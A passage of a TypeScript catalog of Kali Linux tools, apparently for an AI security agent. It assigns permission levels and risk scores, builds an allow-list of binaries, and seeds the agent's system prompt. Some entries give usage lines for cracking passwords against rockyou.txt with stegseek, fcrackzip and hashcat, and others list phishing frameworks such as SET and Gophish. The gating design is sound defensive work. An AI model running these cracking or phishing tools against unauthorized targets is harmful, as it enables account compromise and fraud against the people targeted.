  { binary: 'ddrescue', name: 'GNU ddrescue', category: 'forensics', permission: 'forensics', sudo: true,
    summary: 'Data recovery imaging that copes with read errors.',
    usage: ['ddrescue /dev/sdX image.dd rescue.log'] },
  { binary: 'hashdeep', name: 'hashdeep', category: 'forensics', permission: 'forensics',
    summary: 'Recursive hashing and audit of file sets.',
    usage: ['hashdeep -r /path'] },
]

const REPORTING: KaliToolSpec[] = [
  { binary: 'cutycapt', name: 'CutyCapt', category: 'reporting', permission: 'passive-recon',
    summary: 'Capture a web page as an image for evidence.',
    usage: ['cutycapt --url=URL --out=shot.png'] },
  { binary: 'faraday', name: 'Faraday', category: 'reporting', permission: 'passive-recon',
    summary: 'Collaborative penetration-test IDE and reporting platform.',
    usage: ['faraday-server', 'faraday-client'] },
  { binary: 'dradis', name: 'Dradis', category: 'reporting', permission: 'passive-recon',
    summary: 'Collaboration and reporting for security assessments.',
    usage: ['dradis'] },
]

const SOCIAL_ENGINEERING: KaliToolSpec[] = [
  { binary: 'setoolkit', name: 'SET', category: 'social-engineering', permission: 'social-engineering', destructive: true,
    summary: 'Social-Engineer Toolkit: phishing, cloned sites, payloads.',
    usage: ['setoolkit'], aliases: ['set'] },
  { binary: 'gophish', name: 'Gophish', category: 'social-engineering', permission: 'social-engineering', destructive: true,
    summary: 'Phishing campaign framework with tracking.',
    usage: ['gophish'] },
  { binary: 'king-phisher', name: 'King Phisher', category: 'social-engineering', permission: 'social-engineering', destructive: true,
    summary: 'Phishing campaign toolkit (server + client).',
    usage: ['king-phisher'] },
]

const CRYPTO_STEGO: KaliToolSpec[] = [
  { binary: 'steghide', name: 'Steghide', category: 'crypto-stego', permission: 'forensics',
    summary: 'Hide/extract data in images and audio.',
    usage: ['steghide extract -sf image.jpg', 'steghide embed -cf cover.jpg -ef secret.txt'] },
  { binary: 'stegseek', name: 'StegSeek', category: 'crypto-stego', permission: 'brute-force',
    summary: 'Fast steghide passphrase cracker.',
    usage: ['stegseek image.jpg rockyou.txt'] },
  { binary: 'zsteg', name: 'zsteg', category: 'crypto-stego', permission: 'forensics',
    summary: 'Detect steganography in PNG/BMP files.',
    usage: ['zsteg -a image.png'] },
  { binary: 'outguess', name: 'Outguess', category: 'crypto-stego', permission: 'forensics',
    summary: 'Universal steganography extraction/embedding.',
    usage: ['outguess -r image.jpg out.txt'] },
  { binary: 'fcrackzip', name: 'fcrackzip', category: 'crypto-stego', permission: 'brute-force', destructive: true,
    summary: 'Crack ZIP archive passwords.',
    usage: ['fcrackzip -u -D -p rockyou.txt file.zip'] },
  { binary: 'openssl', name: 'OpenSSL', category: 'crypto-stego', permission: 'passive-recon',
    summary: 'General crypto toolkit — hashing, enc/dec, cert inspection.',
    usage: ['openssl s_client -connect TARGET:443', 'openssl enc -aes-256-cbc -d -in file.enc'] },
  { binary: 'hashcat', name: 'Hashcat (crypto)', category: 'crypto-stego', permission: 'brute-force', destructive: true,
    summary: 'Crack hashes recovered from stego/crypto challenges.',
    usage: ['hashcat -m HASHMODE -a 0 hash.txt rockyou.txt'] },
]

/** The complete flattened catalog. */
export const KALI_TOOLS: KaliToolSpec[] = [
  ...INFORMATION_GATHERING,
  ...VULNERABILITY_ANALYSIS,
  ...WEB_APPLICATION,
  ...DATABASE_ASSESSMENT,
  ...PASSWORD_ATTACKS,
  ...WIRELESS_ATTACKS,
  ...REVERSE_ENGINEERING,
  ...EXPLOITATION,
  ...SNIFFING_SPOOFING,
  ...POST_EXPLOITATION,
  ...FORENSICS,
  ...REPORTING,
  ...SOCIAL_ENGINEERING,
  ...CRYPTO_STEGO,
]

export const KALI_CATEGORIES: KaliCategory[] = [
  'information-gathering',
  'vulnerability-analysis',
  'web-application',
  'database-assessment',
  'password-attacks',
  'wireless-attacks',
  'reverse-engineering',
  'exploitation',
  'sniffing-spoofing',
  'post-exploitation',
  'forensics',
  'reporting',
  'social-engineering',
  'crypto-stego',
]

// ─── Lookup helpers ──────────────────────────────────────────────────────────

/** Map a permission level to a base risk score (1–10). */
export const PERMISSION_RISK: Record<SecurityPermissionLevel, number> = {
  'passive-recon': 1,
  'active-recon': 3,
  'vuln-scanning': 4,
  'web-scanning': 5,
  'forensics': 2,
  'reverse-shell': 4,
  'wireless': 7,
  'brute-force': 7,
  'social-engineering': 8,
  'privilege-escalation': 8,
  'exploitation': 9,
}

/** Normalize a tool identifier for matching (lowercase, strip path). */
function norm(id: string): string {
  const base = id.split(/[/\\]/).pop() || id
  return base.trim().toLowerCase()
}

/**
 * Find a catalog entry by binary name or alias. Because several categories
 * intentionally list the same binary (e.g. sqlmap under both web-application
 * and database-assessment), the *first* match is returned — good enough for
 * risk/permission derivation, which is identical across those duplicates.
 */
export function findTool(id: string): KaliToolSpec | undefined {
  const n = norm(id)
  return KALI_TOOLS.find(t =>
    norm(t.binary) === n || (t.aliases || []).some(a => norm(a) === n))
}

/** All entries in a category. */
export function toolsInCategory(category: KaliCategory): KaliToolSpec[] {
  return KALI_TOOLS.filter(t => t.category === category)
}

/** Free-text search across binary, name, summary, and tags. */
export function searchCatalog(query: string): KaliToolSpec[] {
  const q = query.trim().toLowerCase()
  if (!q) return []
  return KALI_TOOLS.filter(t =>
    t.binary.toLowerCase().includes(q) ||
    t.name.toLowerCase().includes(q) ||
    t.summary.toLowerCase().includes(q) ||
    t.category.includes(q) ||
    (t.aliases || []).some(a => a.toLowerCase().includes(q)))
}

/** The set of unique, allow-listed binaries (for the runner's fast path). */
export function catalogBinaries(): Set<string> {
  const s = new Set<string>()
  for (const t of KALI_TOOLS) {
    s.add(norm(t.binary))
    for (const a of t.aliases || []) s.add(norm(a))
  }
  return s
}

/** Compact per-category index string, used to seed the agent system prompt. */
export function categoryIndex(): string {
  return KALI_CATEGORIES.map(cat => {
    const bins = toolsInCategory(cat).map(t => t.binary)
    const unique = Array.from(new Set(bins))
    return `- ${cat}: ${unique.join(', ')}`
  }).join('\n')
}
